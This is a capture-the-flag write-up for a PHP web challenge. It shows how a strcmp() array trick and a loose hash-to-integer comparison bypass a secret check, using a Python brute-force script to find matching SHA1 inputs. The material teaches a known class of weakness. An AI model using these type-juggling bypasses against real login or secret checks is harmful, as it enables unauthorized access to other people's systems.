# clowns-as-a-service

category: web

> PHP has some inner clown magic like juggling. Can you juggle your way to get the flag?

We are given some source code:
```php
<?php

$secret = 'REDACTED';
$flag = 'blahaj{REDACTED}';

$inputsecret = $_POST['secret'];
$meaningoflife = $_POST['meaningoflife'];

# Check if the secret is correct
if (strcmp($inputsecret, $secret) != 0) {
    echo 'come back with correct secret';
}
else{
    # Check if the meaning of life is correct
    if (hash('sha1',$meaningoflife) != 42) {
        echo 'come back with correct meaning of life';
    }
    else{
        echo 'flag: ' . $flag;
    }
}

?>
```

We have to comparisons to break, the first one is a `strcmp()` between our input secret and the actual secret, and the second one is to bypass the hash function.

## Bypassing the first check

To bypass the first strcmp, we just need to submit an array into `$secret`, and the first check will be bypassed. This is because:
1. if you `strcmp()` an array and a string, it will result in `NULL`
2. `NULL` == 0 is true

So when I submit it, I get:
```html
<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>10</b><br />
come back with correct meaning of life
```

confirming that we have bypassed the first check.

## Bypassing the second check

From [this pdf](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) which is the first result I got when I googled "php type juggling", in Bug #2, if a hash is compared to an integer, then as long as we have the integer followed by a non-numeric character in the hash, it will pass through.

I.e., we need to find a sha1 hash that starts with 42, and whose third digit is not a digit (i.e. can only be a, b, c, d, e, f). We can make a python script that generates various hashes like that:

```py
import hashlib

chars = '0123456789abcdefghijklmnopqrstuvwxyz'
chars = [bytes(c, 'utf-8') for c in chars ]
for i in chars:
    for j in chars:
        for k in chars:
            for l in chars:
                for m in chars:
                    hash = hashlib.sha1(i+j+k+l+m).hexdigest()
                    if hash[:2].isnumeric() and int(hash[:2]) == 42 and not hash[2].isnumeric():
                        print(i+j+k+l+m)
                        print(hash)
```

As it turns out this generates *a lot* of "valid" hashes so I took one, and submitted it as the `meaningoflife`.

I received:
```html
<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>10</b><br />
flag: blahaj{php_is_the_biggest_clown_of_all_the_clowns}
```